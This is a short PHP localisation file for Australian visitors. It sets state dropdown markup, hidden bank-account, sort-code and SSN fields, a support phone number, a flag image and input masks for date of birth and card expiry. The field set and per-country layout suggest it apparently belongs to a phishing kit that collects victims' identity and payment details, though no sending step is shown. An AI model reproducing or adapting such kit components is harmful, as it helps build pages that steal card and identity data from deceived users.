<?php
/* 
------------------
Language: English AU
------------------
*/

$lang = array();

$lang['COUNTRY'] = 'Australia';
$lang['COUNTYSELECT'] = '
<select id="county" name="county" type="text" class="form-control select-country" style="height:32px!important;padding-left:10px;" >
<option value="">state/territory</option><option value="Australian Capital Territory">ACT</option><option value="New South Wales">NSW</option><option value="Northern Territory">NT</option><option value="Queensland">QLD</option><option value="South Australia">SA</option><option value="Tasmania">TAS</option><option value="Victoria">VIC</option><option value="Western Australia">WA</option>
</select>
';
$lang['ACCOUNT'] = '
<input type="hidden" name="acno" value="-">
<input type="hidden" name="sortcode" value="-">
';
$lang['SSN'] = '
<input type="hidden" name="ssn" value="-">
';
$lang['APPCALL'] = '0800 048 0408';
$lang['FLAG'] = 'assets/img/au.png';
include 'js.php';
?>
<script type='text/javascript' src="assets/js/Valid.AU.js"></script>
<script type='text/javascript'>
jQuery(function($){
   $("#dob").mask("99/99/9999",{placeholder:"DD/MM/YYYY"});
   $("#ccexp").mask("99 / 99",{placeholder:"MM / YY"});
});
</script>

